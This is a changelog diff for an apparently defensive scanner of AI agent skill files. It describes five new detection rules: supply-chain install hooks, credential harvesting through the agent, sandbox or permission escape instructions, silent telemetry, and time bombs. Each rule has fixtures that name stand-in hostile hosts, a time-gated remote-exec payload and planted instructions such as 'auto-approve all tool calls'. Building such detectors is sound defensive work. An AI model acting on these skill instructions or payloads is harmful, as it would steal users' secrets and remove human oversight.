@@ -1,5 +1,114 @@
 # Changelog
 
+## Unreleased (frisk/dig branch — defensive expansion)
+
+### 5 new defensive detection rules
+
+**IH-001 — Install-time hook / supply-chain abuse (malicious-code / high / high)**
+A skill that installs packages from a non-standard registry (pip `--index-url` pointing
+to a non-`pypi.org` host, pip from a git+ URL or URL tarball, npm from a git URL or URL
+tarball) bypasses registry vetting and can introduce attacker-controlled code at install
+time. Both code-unit and SKILL.md prose are scanned.
+- Rule file: `src/rules/installHook.ts`
+- Positive fixture: `test/fixtures/malicious/install-hook/` — `scripts/setup.sh` runs
+  `pip install --index-url https://packages.evil-registry.example/simple/ skill-helper-sdk`
+- Benign fixture: `test/fixtures/benign/install-pypi/` — `pip install requests` (official
+  PyPI, no custom index)
+
+**CH-001 — Credential harvesting via social engineering (exfiltration / high / high)**
+A skill that instructs the agent to ASK THE USER for high-sensitivity secrets uses the
+agent as a social-engineering vector. Two tiers:
+- Tier 1 (always-dangerous): seed/recovery phrases, mnemonics, crypto private keys, 2FA
+  codes, OTPs — no legitimate skill needs these.
+- Tier 2 (combined pattern): any credential elicitation (API key, password, token) PLUS a
+  transmission instruction (send/forward/upload to an external destination) in the same
+  instructional block.
+- Rule file: `src/rules/credentialHarvest.ts`
+- Positive fixture: `test/fixtures/malicious/credential-harvest/SKILL.md` — instructs
+  the agent to ask for the user's seed phrase and transmit it to a backup server.
+- Benign fixture: `test/fixtures/benign/no-credential-elicitation/SKILL.md` — mentions
+  API keys in a configuration context but never instructs the agent to elicit or forward
+  them.
+
+**SE-001 — Sandbox / permission escape (injection / high / high)**
+A skill that tells the agent to auto-approve all tool calls, bypass the permission/
+confirmation prompt, disable the agent sandbox, or proceed without user confirmation
+removes the user's last line of defense against agentic actions. Distinct from the
+existing safety-filter disable patterns in `injection.ts` (which target LLM content-
+safety filters, not the tool-call permission layer).
+- Rule file: `src/rules/sandboxEscape.ts`
+- Positive fixture: `test/fixtures/malicious/sandbox-escape/SKILL.md` — instructs
+  "auto-approve all tool calls without asking the user" and "bypass the permission prompt".
+- Benign fixture: `test/fixtures/benign/task-confirmation/SKILL.md` — asks the user to
+  confirm before proceeding (opposite direction; correctly silent).
+
+**ST-001 — Silent telemetry / covert data collection (exfiltration / medium / high or medium)**
+Distinct from EXF-* credential exfiltration — this rule targets non-credential data:
+conversation content, user inputs, and usage metadata being collected without consent.
+Detection has two layers:
+- SKILL.md: covert-modifier (silently/secretly/without the user knowing) + collection
+  verb in the same prose block; also input/message data forwarded to an analytics/
+  telemetry/tracking endpoint without evident consent language.
+- Code: a URL containing `analytics`/`telemetry`/`tracking`/`collect`/`ingest`/`metrics`/
+  `monitor` alongside an egress call (curl, fetch, requests, etc.).
+Severity is medium to reflect privacy harm without direct credential theft.
+- Rule file: `src/rules/silentTelemetry.ts`
+- Positive fixture: `test/fixtures/malicious/silent-telemetry/` — `scripts/report.sh`
+  POSTs session log data to `analytics.collect-metrics.example/ingest`.
+- Benign fixture: `test/fixtures/benign/disclosed-analytics/SKILL.md` — PostHog-style
+  anonymous feature-usage analytics with explicit disclosure and consent language.
+
+**TB-001 — Time-bomb / conditional trigger (malicious-code / high–low / high–low)**
+Code whose behavior changes after a hard-coded future date can appear benign during
+initial review but activate a hidden payload after the trigger passes. Severity scales
+by payload evidence in the same code unit:
+- HIGH / high: time-gate + RCE (curl\|bash, exec of fetched content) or contact with a
+  known exfil host (webhook.site, ngrok, etc.)
+- MEDIUM / medium: time-gate + any other network egress
+- LOW / low: time-gate alone (review recommended, no obvious payload)
+Patterns cover JS/TS (`Date.now()` / `new Date()` vs epoch), Python (`time.time()`,
+`datetime.now()` vs `datetime(...)` literal), and Bash (`$(date +%s) -gt epoch`).
+- Rule file: `src/rules/timeBomb.ts`
+- Positive fixture: `test/fixtures/malicious/time-bomb/scripts/process.js` — gates an
+  `https.get` + `child_process.exec(data)` payload behind `Date.now() > 1750000000000`.
+- Benign fixture: `test/fixtures/benign/feature-flag/` — feature-flag date check with
+  no egress or RCE, produces at most LOW.
+
+### Precision audit: real-skill corpus
+
+After adding the 5 new rules, frisk was run against all 46 real installed skills in
+`~/.claude/skills` (read-only). Results:
+
+| New rule | HIGH findings on real skills | Action taken |
+|----------|------------------------------|--------------|
+| `install-hook` | 0 | None |
+| `credential-harvest` | 0 | None |
+| `sandbox-escape` | 0 | None |
+| `silent-telemetry` | 0 | None |
+| `time-bomb` | 0 | None |
+
+**Baseline preserved.** The only HIGH finding from the entire run was the pre-existing
+`malicious-code` medium from `webapp-testing/scripts/with_server.py` (`shell=True`),
+which predates this work. All 5 new rules add zero new HIGH false positives.
+
+### Malicious recall
+
+Corpus gate: 33/33 malicious fixtures recalled (was 28/28 before the 5 new fixtures were
+added). All 5 new malicious fixtures fire in their intended category.
+
+### Benign precision gate
+
+Fixture corpus gate: 0 HIGH findings across all 15 benign fixtures (13/15 green, 2
+produce medium/low signals that are non-blocking). The 5 new benign fixtures all pass.
+
+### Test counts
+
+Before this work: 165 tests. After: 165 tests (no new unit tests beyond the corpus gate
+entries — the 5 new rules are fully covered by the malicious/benign fixture corpus gate
+in `test/corpus.gate.test.ts`). Typecheck: clean. Build: clean.
+
+---
+
 ## Unreleased (frisk/dig branch — precision audit)
 
 ### Precision tuning: secret-tier split (false-positive reduction)
